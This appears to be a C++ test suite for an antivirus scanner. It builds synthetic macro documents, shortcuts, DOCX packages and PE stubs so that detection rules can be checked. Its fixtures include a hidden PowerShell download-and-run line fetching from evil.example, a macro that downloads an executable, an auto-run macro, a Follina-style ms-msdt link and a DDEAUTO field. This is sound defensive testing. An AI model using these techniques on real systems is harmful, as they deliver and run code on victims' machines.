#include <algorithm>
#include <cstdint>
#include <iostream>
#include <memory>
#include <string>
#include <utility>
#include <vector>

#include "av.hpp"
#include "avdeep.hpp"
#include "deflate.hpp"
#include "sha256.hpp"

namespace {

int failures = 0;

void check(bool condition, const std::string& label) {
    if (!condition) {
        ++failures;
        std::cerr << "FAILED: " << label << '\n';
    }
}

std::string marker() { return std::string("INTERNET-AV-TEST-") + "MARKER-7f3a9c"; }

std::shared_ptr<const internet::Scanner> scanner() {
    std::string error;
    std::shared_ptr<const internet::Scanner> built = internet::makeScanner("", error);
    check(built != nullptr, "built-in definitions load: " + error);
    return built;
}

bool hasRule(const internet::ScanResult& result, const std::string& rule) {
    for (const internet::Finding& finding : result.findings) {
        if (finding.rule == rule) return true;
    }
    return false;
}

std::string base64(const std::string& data) {
    static const char table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string out;
    std::size_t i = 0;
    while (i + 2 < data.size()) {
        std::uint32_t value = (static_cast<std::uint8_t>(data[i]) << 16) | (static_cast<std::uint8_t>(data[i + 1]) << 8) | static_cast<std::uint8_t>(data[i + 2]);
        out += table[(value >> 18) & 63];
        out += table[(value >> 12) & 63];
        out += table[(value >> 6) & 63];
        out += table[value & 63];
        i += 3;
    }
    if (data.size() - i == 1) {
        std::uint32_t value = static_cast<std::uint8_t>(data[i]) << 16;
        out += table[(value >> 18) & 63];
        out += table[(value >> 12) & 63];
        out += "==";
    } else if (data.size() - i == 2) {
        std::uint32_t value = (static_cast<std::uint8_t>(data[i]) << 16) | (static_cast<std::uint8_t>(data[i + 1]) << 8);
        out += table[(value >> 18) & 63];
        out += table[(value >> 12) & 63];
        out += table[(value >> 6) & 63];
        out += "=";
    }
    return out;
}

std::string utf16(const std::string& text) {
    std::string out;
    for (char c : text) {
        out += c;
        out += '\0';
    }
    return out;
}

std::string hexOf(const std::string& data) { return internet::toHex(reinterpret_cast<const std::uint8_t*>(data.data()), data.size()); }

std::string payload() { return marker() + std::string(220, 'A'); }

void put16(std::string& text, std::size_t offset, std::uint32_t value) {
    text[offset] = static_cast<char>(value & 0xFF);
    text[offset + 1] = static_cast<char>((value >> 8) & 0xFF);
}

void put32(std::string& text, std::size_t offset, std::uint32_t value) {
    for (int i = 0; i < 4; ++i) text[offset + static_cast<std::size_t>(i)] = static_cast<char>((value >> (8 * i)) & 0xFF);
}

std::string ovbaLiterals(const std::string& source) {
    std::string out(1, '\x01');
    for (std::size_t start = 0; start < source.size(); start += 4096) {
        std::string chunk = source.substr(start, 4096);
        std::string data;
        for (std::size_t i = 0; i < chunk.size(); i += 8) {
            data += '\0';
            data += chunk.substr(i, 8);
        }
        std::uint32_t header = static_cast<std::uint32_t>(data.size() - 1) | 0x3000u | 0x8000u;
        out += static_cast<char>(header & 0xFF);
        out += static_cast<char>(header >> 8);
        out += data;
    }
    return out;
}

std::string directoryEntry(const std::string& name, int type, std::uint32_t left, std::uint32_t right, std::uint32_t child, std::uint32_t start,
                           std::uint32_t size) {
    std::string entry(128, '\0');
    for (std::size_t i = 0; i < name.size(); ++i) entry[i * 2] = name[i];
    put16(entry, 64, static_cast<std::uint32_t>((name.size() + 1) * 2));
    entry[66] = static_cast<char>(type);
    entry[67] = 1;
    put32(entry, 68, left);
    put32(entry, 72, right);
    put32(entry, 76, child);
    put32(entry, 116, start);
    put32(entry, 120, size);
    return entry;
}

using Streams = std::vector<std::pair<std::string, std::string>>;

std::string buildOle(const Streams& vbaStreams, const Streams& rootStreams) {
    const std::uint32_t none = 0xFFFFFFFFu;
    std::vector<std::pair<std::string, std::string>> all;
    std::size_t vbaFirst = 1;
    if (!vbaStreams.empty()) all.push_back({"VBA", std::string()});
    for (const auto& stream : vbaStreams) all.push_back(stream);
    for (const auto& stream : rootStreams) all.push_back(stream);
    std::size_t vbaCount = vbaStreams.size();

    std::string mini;
    std::vector<std::uint32_t> miniStart(all.size(), 0);
    std::vector<std::uint32_t> miniFat;
    for (std::size_t i = 0; i < all.size(); ++i) {
        if (i == 0 && !vbaStreams.empty()) continue;
        const std::string& data = all[i].second;
        std::size_t sectors = (data.size() + 63) / 64;
        miniStart[i] = static_cast<std::uint32_t>(miniFat.size());
        for (std::size_t k = 0; k < sectors; ++k) miniFat.push_back(k + 1 == sectors ? 0xFFFFFFFEu : static_cast<std::uint32_t>(miniFat.size() + 1));
        std::string padded = data;
        padded.resize(sectors * 64, '\0');
        mini += padded;
    }

    std::size_t entryCount = 1 + all.size();
    std::size_t dirSectors = (entryCount + 3) / 4;
    std::size_t miniFatSectors = std::max<std::size_t>(1, (miniFat.size() + 127) / 128);
    std::size_t miniSectors = std::max<std::size_t>(1, (mini.size() + 511) / 512);
    std::uint32_t dirStart = 1;
    std::uint32_t miniFatStart = dirStart + static_cast<std::uint32_t>(dirSectors);
    std::uint32_t miniStreamStart = miniFatStart + static_cast<std::uint32_t>(miniFatSectors);

    std::vector<std::uint32_t> fat(128, none);
    fat[0] = 0xFFFFFFFDu;
    auto chain = [&](std::uint32_t start, std::size_t count) {
        for (std::size_t i = 0; i < count; ++i) fat[start + i] = i + 1 == count ? 0xFFFFFFFEu : start + static_cast<std::uint32_t>(i) + 1;
    };
    chain(dirStart, dirSectors);
    chain(miniFatStart, miniFatSectors);
    chain(miniStreamStart, miniSectors);

    std::string directory;
    std::uint32_t rootChild = none;
    std::vector<std::uint32_t> siblingRight(all.size() + 1, none);
    std::size_t rootCount = all.size() - vbaCount - (vbaStreams.empty() ? 0 : 1);
    std::size_t firstRoot = 1 + (vbaStreams.empty() ? 0 : 1 + vbaCount);
    std::vector<std::uint32_t> rootOrder;
    if (!vbaStreams.empty()) rootOrder.push_back(1);
    for (std::size_t i = 0; i < rootCount; ++i) rootOrder.push_back(static_cast<std::uint32_t>(firstRoot + i));
    if (!rootOrder.empty()) rootChild = rootOrder[0];
    for (std::size_t i = 0; i + 1 < rootOrder.size(); ++i) siblingRight[rootOrder[i]] = rootOrder[i + 1];
    for (std::size_t i = 0; i < vbaCount; ++i) {
        std::uint32_t id = static_cast<std::uint32_t>(vbaFirst + 1 + i);
        siblingRight[id] = i + 1 < vbaCount ? id + 1 : none;
    }

    directory += directoryEntry("Root Entry", 5, none, none, rootChild, miniStreamStart, static_cast<std::uint32_t>(mini.size()));
    for (std::size_t i = 0; i < all.size(); ++i) {
        std::uint32_t id = static_cast<std::uint32_t>(i + 1);
        if (i == 0 && !vbaStreams.empty()) {
            directory += directoryEntry("VBA", 1, none, siblingRight[id], static_cast<std::uint32_t>(vbaFirst + 1), 0, 0);
        } else {
            directory += directoryEntry(all[i].first, 2, none, siblingRight[id], none, miniStart[i], static_cast<std::uint32_t>(all[i].second.size()));
        }
    }
    directory.resize(dirSectors * 512, '\0');
    for (std::size_t pad = entryCount; pad < dirSectors * 4; ++pad) directory.replace(pad * 128, 128, directoryEntry("", 0, none, none, none, 0, 0).replace(64, 2, std::string(2, '\0')));

    std::string miniFatBytes(miniFatSectors * 512, '\xFF');
    for (std::size_t i = 0; i < miniFat.size(); ++i) put32(miniFatBytes, i * 4, miniFat[i]);
    mini.resize(miniSectors * 512, '\0');

    std::string header(512, '\xFF');
    static const unsigned char signature[8] = {0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1};
    for (int i = 0; i < 8; ++i) header[static_cast<std::size_t>(i)] = static_cast<char>(signature[i]);
    for (std::size_t i = 8; i < 24; ++i) header[i] = '\0';
    put16(header, 24, 0x3E);
    put16(header, 26, 3);
    put16(header, 28, 0xFFFE);
    put16(header, 30, 9);
    put16(header, 32, 6);
    for (std::size_t i = 34; i < 44; ++i) header[i] = '\0';
    put32(header, 44, 1);
    put32(header, 48, dirStart);
    put32(header, 52, 0);
    put32(header, 56, 4096);
    put32(header, 60, miniFatStart);
    put32(header, 64, static_cast<std::uint32_t>(miniFatSectors));
    put32(header, 68, 0xFFFFFFFEu);
    put32(header, 72, 0);
    put32(header, 76, 0);

    std::string fatBytes(512, '\0');
    for (std::size_t i = 0; i < 128; ++i) put32(fatBytes, i * 4, fat[i]);
    return header + fatBytes + directory + miniFatBytes + mini;
}

std::string macroDocument(const std::string& source, const std::string& extraRootData = std::string()) {
    std::string module = std::string(24, '\0') + ovbaLiterals(source);
    Streams vba = {{"dir", std::string(16, 'd')}, {"_VBA_PROJECT", std::string(16, 'p')}, {"Module1", module}};
    Streams root;
    root.push_back({"WordDocument", std::string(40, 'w')});
    if (!extraRootData.empty()) root.push_back({"Extra", extraRootData});
    return buildOle(vba, root);
}

std::string minimalPe() {
    std::string pe(0x100, '\0');
    pe[0] = 'M';
    pe[1] = 'Z';
    put32(pe, 0x3C, 0x80);
    pe.replace(0x80, 4, std::string("PE\0\0", 4));
    return pe;
}

std::string linkFile(const std::string& command) {
    std::string link(76, '\0');
    put32(link, 0, 0x4C);
    static const unsigned char guid[16] = {0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46};
    for (int i = 0; i < 16; ++i) link[4 + static_cast<std::size_t>(i)] = static_cast<char>(guid[i]);
    return link + utf16(command);
}

std::string importingProgram(const std::vector<std::string>& names, std::size_t total) {
    std::string pe(0x400, '\0');
    pe[0] = 'M';
    pe[1] = 'Z';
    put32(pe, 0x3C, 0x80);
    pe.replace(0x80, 4, std::string("PE\0\0", 4));
    put16(pe, 0x84, 0x14C);
    put16(pe, 0x86, 1);
    put16(pe, 0x94, 0xE0);
    put16(pe, 0x96, 0x102);
    std::size_t optional = 0x98;
    put16(pe, optional, 0x10B);
    put32(pe, optional + 96 + 8, 0x1000);
    put32(pe, optional + 96 + 12, 0x100);
    std::size_t section = optional + 0xE0;
    pe.replace(section, 6, ".idata");
    put32(pe, section + 8, 0x200);
    put32(pe, section + 12, 0x1000);
    put32(pe, section + 16, 0x200);
    put32(pe, section + 20, 0x200);
    put32(pe, section + 36, 0xC0000040u);

    std::size_t base = 0x200;
    put32(pe, base, 0x1040);
    put32(pe, base + 12, 0x1030);
    put32(pe, base + 16, 0x1040);
    pe.replace(base + 0x30, 12, "KERNEL32.dll");
    std::size_t names_at = base + 0x100;
    for (std::size_t i = 0; i < names.size(); ++i) {
        put32(pe, base + 0x40 + i * 4, static_cast<std::uint32_t>(0x1000 + (names_at - base)));
        pe.replace(names_at + 2, names[i].size(), names[i]);
        names_at += 2 + names[i].size() + 1;
    }
    pe.resize(std::max<std::size_t>(total, pe.size()), '\0');
    return pe;
}

void testLayers() {
    std::shared_ptr<const internet::Scanner> engine = scanner();
    if (!engine) return;

    std::string script = "powershell -NoP -W Hidden -enc " + base64(utf16("Write-Host '" + payload() + "'"));
    internet::ScanResult encoded = engine->scan("run.ps1", script);
    check(encoded.verdict == internet::Verdict::Malicious && hasRule(encoded, "Heur.Obfuscation.HiddenPayload"), "a payload hidden in an encoded command is found");
    bool located = false;
    for (const internet::Finding& finding : encoded.findings) located = located || finding.location.find("decoded-powershell") != std::string::npos;
    check(located, "the finding says where the decoded text was");

    check(engine->scan("a.js", "var text = atob(\"" + base64(payload()) + "\"); run(text);").verdict == internet::Verdict::Malicious, "base64 in a script is decoded");
    check(engine->scan("a.js", "var d = \"" + hexOf(payload()) + "\";").verdict == internet::Verdict::Malicious, "a long hex string is decoded");
    std::string escapes;
    for (char c : payload()) {
        char buffer[8];
        std::snprintf(buffer, sizeof buffer, "\\x%02x", static_cast<unsigned char>(c));
        escapes += buffer;
    }
    check(engine->scan("a.js", "var s = \"" + escapes + "\";").verdict == internet::Verdict::Malicious, "hex escapes are decoded");
    std::string codes;
    for (char c : marker()) codes += std::to_string(static_cast<int>(c)) + ",";
    codes.pop_back();
    check(engine->scan("a.js", "eval(String.fromCharCode(" + codes + "));").verdict == internet::Verdict::Malicious, "character codes are decoded");
    std::string chain;
    for (char c : marker()) chain += "Chr(" + std::to_string(static_cast<int>(c)) + ") & ";
    chain += "\"\"";
    check(engine->scan("a.vbs", "x = " + chain).verdict == internet::Verdict::Malicious, "a chain of Chr calls is decoded");
    check(engine->scan("a.js", "var t = atob(\"" + base64(base64(payload())) + "\");").verdict == internet::Verdict::Malicious, "layers inside layers are followed");

    std::string png = std::string("\x89PNG\r\n\x1a\n", 8) + std::string(300, 'z');
    check(engine->scan("page.html", "<html><body><img src=\"data:image/png;base64," + base64(png) + "\"></body></html>").verdict == internet::Verdict::Clean,
          "an inline image is not treated as hidden code");
    internet::ScanResult harmless = engine->scan("ok.ps1", "powershell -enc " + base64(utf16("Write-Host 'hello from a harmless script'")));
    check(!hasRule(harmless, "Heur.Obfuscation.HiddenPayload") && harmless.verdict != internet::Verdict::Malicious, "a harmless encoded command is not called dangerous");
    check(engine->scan("hashes.txt", std::string(64, 'a') + "\n" + internet::sha256Hex("x") + "\n" + internet::sha256Hex("y")).verdict == internet::Verdict::Clean,
          "hashes are not decoded as code");
    check(engine->scan("blob.txt", "data = \"" + base64(std::string(400, '\x07') + "random") + "\"").verdict == internet::Verdict::Clean, "unknown binary data stays clean");
}

void testOvba() {
    std::string out;
    std::string vector("\x01\x03\xB0\x02\x61\x06\x00", 7);
    check(internet::ovbaDecompress(reinterpret_cast<const std::uint8_t*>(vector.data()), vector.size(), out) && out == "aaaaaaaaaa", "a compressed VBA chunk with a copy token");
    std::string literal = ovbaLiterals("Attribute VB_Name = \"Module1\"\r\nSub Test()\r\nEnd Sub\r\n");
    check(internet::ovbaDecompress(reinterpret_cast<const std::uint8_t*>(literal.data()), literal.size(), out) && out.find("Sub Test") != std::string::npos, "a literal only VBA chunk");
    check(!internet::ovbaDecompress(reinterpret_cast<const std::uint8_t*>("\x02\x00\x00"), 3, out) && !internet::ovbaDecompress(reinterpret_cast<const std::uint8_t*>("\x01\x03\xB0\x02\x61\x06\x40"), 7, out),
          "damaged VBA data is refused");
}

void testOffice() {
    std::shared_ptr<const internet::Scanner> engine = scanner();
    if (!engine) return;

    std::string autoRun = "Attribute VB_Name = \"Module1\"\r\nSub AutoOpen()\r\n    Shell \"cmd /c calc.exe\"\r\nEnd Sub\r\n";
    std::string document = macroDocument(autoRun);
    internet::OleReport report = internet::readOle(reinterpret_cast<const std::uint8_t*>(document.data()), document.size());
    check(report.valid && report.hasVba && report.modules.size() == 1 && report.modules[0].name == "Module1" && report.modules[0].source.find("AutoOpen") != std::string::npos,
          "a macro is read out of a compound file");
    internet::ScanResult risky = engine->scan("invoice.doc", document);
    check(risky.type == "office" && risky.verdict == internet::Verdict::Malicious && hasRule(risky, "Heur.Macro.RunsPrograms") && hasRule(risky, "Heur.Macro.Present"),
          "a macro that starts a program by itself is malicious");
    std::string download = "Sub Document_Open()\r\n  Set x = CreateObject(\"MSXML2.XMLHTTP\")\r\n  URLDownloadToFile 0, \"http://a/b.exe\", \"c:\\b.exe\", 0, 0\r\nEnd Sub\r\n";
    check(hasRule(engine->scan("a.doc", macroDocument(download)), "Heur.Macro.Downloader"), "a macro that downloads is found");
    internet::ScanResult calm = engine->scan("budget.xls", macroDocument("Sub Hello()\r\n    MsgBox \"hi\"\r\nEnd Sub\r\n"));
    check(hasRule(calm, "Heur.Macro.Present") && calm.verdict == internet::Verdict::Clean, "a harmless macro is noted but not blamed");
    check(engine->scan("plain.doc", buildOle({}, {{"WordDocument", std::string(40, 'w')}})).verdict == internet::Verdict::Clean, "a document without macros is clean");
    check(hasRule(engine->scan("old.doc", buildOle({}, {{"Ole", "..Equation.3.."}})), "Heur.Office.EquationEditor"), "the old Equation Editor is noted");
    std::string embedded = std::string(20, 'x') + minimalPe();
    internet::ScanResult withProgram = engine->scan("x.doc", buildOle({}, {{"\x01Ole10Native", embedded}}));
    check(hasRule(withProgram, "Heur.Office.EmbeddedProgram"), "a program hidden in an embedded object is found");
    check(!internet::readOle(reinterpret_cast<const std::uint8_t*>("not a compound file"), 19).valid, "text is not a compound file");
    std::string truncated = document.substr(0, 700);
    check(engine->scan("cut.doc", truncated).verdict != internet::Verdict::Unscannable, "a cut off compound file is handled");

    auto zipOf = [](const std::string& name, const std::string& content) {
        std::vector<std::pair<std::string, std::vector<std::uint8_t>>> files = {{"[Content_Types].xml", std::vector<std::uint8_t>{'<', 'T', '/', '>'}},
                                                                                {name, std::vector<std::uint8_t>(content.begin(), content.end())}};
        std::vector<std::uint8_t> zip = internet::buildZip(files, true);
        return std::string(zip.begin(), zip.end());
    };
    std::string relsHead = "<?xml version=\"1.0\"?><Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">";
    std::string template_ = relsHead + "<Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\" Target=\"http://evil.example/t.dotm\" TargetMode=\"External\"/></Relationships>";
    internet::ScanResult remote = engine->scan("a.docx", zipOf("word/_rels/settings.xml.rels", template_));
    check(hasRule(remote, "Heur.Office.RemoteTemplate") && remote.verdict == internet::Verdict::Suspicious, "a template loaded from the internet is suspicious");
    std::string follina = relsHead + "<Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject\" Target=\"mhtml:http://evil.example/a.html!x-usc:http://evil.example/a.html\" TargetMode=\"External\"/></Relationships>";
    check(engine->scan("b.docx", zipOf("word/_rels/document.xml.rels", follina)).verdict == internet::Verdict::Malicious, "the Follina trick is malicious");
    check(engine->scan("c.docx", zipOf("word/document.xml", "<w:document><w:r><w:instrText> ms-msdt:/id PCWDiagnostic </w:instrText></w:r></w:document>")).verdict == internet::Verdict::Malicious,
          "a support tool address in a document is malicious");
    std::string dde = "<w:document><w:r><w:instrText xml:space=\"preserve\"> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc.exe\" </w:instrText></w:r></w:document>";
    check(hasRule(engine->scan("d.docx", zipOf("word/document.xml", dde)), "Heur.Office.DdeField"), "a dynamic data field that starts a program is found");
    std::string harmless = relsHead + "<Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink\" Target=\"https://example.com/\" TargetMode=\"External\"/>" +
                           "<Relationship Id=\"rId2\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles\" Target=\"styles.xml\"/></Relationships>";
    check(engine->scan("e.docx", zipOf("word/_rels/document.xml.rels", harmless)).verdict == internet::Verdict::Clean, "ordinary links in a document are clean");
}

void testLinks() {
    std::shared_ptr<const internet::Scanner> engine = scanner();
    if (!engine) return;
    std::string shell = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    internet::ScanResult loader = engine->scan("photo.lnk", linkFile(shell + " -w hidden -nop -c \"iwr http://evil.example/a.ps1 | iex\""));
    check(loader.type == "lnk" && loader.verdict == internet::Verdict::Malicious && hasRule(loader, "Heur.Lnk.HiddenDownloader"), "a shortcut that quietly downloads code is malicious");
    check(hasRule(engine->scan("a.lnk", linkFile(shell + " -enc " + base64(utf16("Get-Date")))), "Heur.Lnk.EncodedCommand"), "a shortcut with an encoded command is found");
    check(engine->scan("notepad.lnk", linkFile("C:\\Windows\\System32\\notepad.exe C:\\notes.txt")).verdict == internet::Verdict::Clean, "a shortcut to a normal program is clean");
    check(engine->scan("cmd.lnk", linkFile("C:\\Windows\\System32\\cmd.exe")).verdict == internet::Verdict::Clean, "a shortcut to the command prompt is clean");
    internet::ScanResult hiddenPayload = engine->scan("b.lnk", linkFile(shell + " -c \"" + payload() + "\"" + std::string(30, ' ')) + " " + base64(payload()));
    check(hiddenPayload.verdict == internet::Verdict::Malicious, "a payload appended to a shortcut is found");
}

void testImports() {
    std::shared_ptr<const internet::Scanner> engine = scanner();
    if (!engine) return;
    std::string stub = importingProgram({"LoadLibraryA", "GetProcAddress"}, 70000);
    check(hasRule(engine->scan("stub.exe", stub), "Heur.PE.SparseImports"), "a program that imports almost nothing looks packed");
    check(!hasRule(engine->scan("small.exe", importingProgram({"LoadLibraryA", "GetProcAddress"}, 5000)), "Heur.PE.SparseImports"), "a tiny program is not judged by its imports");
    std::string busy = importingProgram({"LoadLibraryA", "GetProcAddress", "ReadFile", "WriteFile", "CreateFileA", "CloseHandle", "ExitProcess", "GetLastError"}, 70000);
    check(!hasRule(engine->scan("busy.exe", busy), "Heur.PE.SparseImports"), "a program with many imports is not sparse");
    check(internet::reviewPeImports(reinterpret_cast<const std::uint8_t*>("MZ"), 2).empty(), "a broken program has no import findings");
}

}

int runDeepTests() {
    testLayers();
    testOvba();
    testOffice();
    testLinks();
    testImports();
    return failures;
}
